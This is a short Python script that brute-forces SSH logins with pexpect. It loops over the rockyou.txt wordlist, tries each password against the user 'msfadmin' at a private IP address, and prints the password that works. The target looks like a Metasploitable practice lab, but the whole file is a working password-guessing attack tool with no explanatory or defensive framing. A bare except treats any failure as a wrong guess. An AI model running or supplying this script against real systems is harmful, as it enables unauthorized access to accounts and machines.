#!/usr/bin/python3

import pexpect
from termcolor import colored
prompt = ["# ",">>> ","> ","\$ "]

#def sendcommand(child,cmd):
	#child.sendline(cmd)
	#child.expect(prompt)
	#print(child.before)

def connect(username,hostname,password):
	key = ""
	stru = "ssh" + " " + username + "@" + hostname
	child = pexpect.spawn(stru)
	rel = child.expect([pexpect.TIMEOUT,key,'[P|p]assword:'])
	if rel ==0:
		print("# error")
	if rel == 1:
		child.sendline("yes")
		rel = child.expect([pexpect.TIMEOUT,'[P|p]assword:'])
		if rel == 0:
			print("# error")
	child.sendline(password)
	child.expect(prompt,timeout=1)
	return child


def main():
	username = "msfadmin"
	hostname = "10.10.225.93"
	password = "msfadmin"
	#child = connect(username,hostname,password)
	f= open("/usr/share/wordlists/rockyou.txt","r")
	for line in f:
		try:
			line = line.strip("\n")
			print(colored("password trying : " + line,"green"))
			child = connect(username,hostname,line)
			print(colored("correct pssword : " + line,"red"))
			break
		except:
			pass
			#print("this is wrong password",line)
			#print("# password is not in list")
main()
